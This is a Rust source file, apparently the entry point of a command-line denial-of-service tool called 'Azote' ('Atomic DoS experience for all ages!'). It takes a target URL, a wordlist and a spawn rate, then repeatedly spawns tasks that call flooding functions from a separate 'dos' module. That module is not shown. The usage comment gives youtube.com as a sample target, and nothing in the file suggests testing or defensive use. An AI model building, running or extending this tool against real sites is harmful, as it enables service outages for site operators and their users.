mod dos;

use colored::*;

use std::env;

#[tokio::main]
async fn main() {
    let arguments: Vec<String> = env::args().collect();
    
    //azote --url https://youtube.com --wordlist wlist.txt --forever || --until --spawnrate 1
    if arguments.len() > 7 {
        let main_argument = &arguments[1].to_string();
        match main_argument.as_str() {
            "--url" => {
                let url = arguments[2].clone().to_string();
                let wordlist = arguments[4].clone().to_string();
                let mode = arguments[5].clone().to_string();
                let spawnrate_raw = arguments[7].clone().to_string();

                let spawnrate = spawnrate_raw.parse::<u8>().expect("Failed to parse");
                let mut spawnnumber: u8 = 0;

                match mode.as_str() {
                    "--until" => {
                        while spawnnumber < spawnrate {
                            let _ = tokio::task::spawn(dos::denial_of_service_end(wordlist.clone(), url.clone())).await;
                            spawnnumber += 1;
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                        }
                    },

                    "--forever" => {
                        while spawnnumber < spawnrate {
                            let _ = tokio::task::spawn(dos::denial_of_service_loop(wordlist.clone(), url.clone())).await;
                            spawnnumber += 1;
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                        }
                    },

                    _ => {
                        println!("{}: Unknown Mode: {}", "Error".red(), mode);
                    }
                }
            },
            
            "--help" => {
                println!("{}", "Azote".blue());
                println!("Atomic DoS experience for all ages!");
            },
            
             _ => {
                 println!("{}: Unknown Argument: {}", "Error".red(), main_argument);
             }
        }
    } else {
        println!("{}: Insufficent Arguments", "Error".red());
    }
}
